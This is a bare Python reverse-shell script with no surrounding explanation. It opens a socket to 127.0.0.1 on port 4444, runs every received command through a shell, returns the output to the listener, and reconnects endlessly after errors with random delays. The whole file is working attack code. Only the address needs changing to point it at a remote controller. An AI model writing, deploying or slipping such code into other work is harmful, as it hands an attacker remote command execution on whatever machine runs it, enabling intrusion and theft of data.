import socket
import subprocess
import os
import sys
import time
import random

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 4444))
    while True:
        command = s.recv(1024).decode("utf-8")
        if command.lower() == "exit":
            break
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send(output.stdout.read())
        s.send(output.stderr.read())
    s.close()

def main():
    while True:
        try:
            connect()
        except:
            time.sleep(random.randint(1, 10))
            
if __name__ == "__main__":
    main()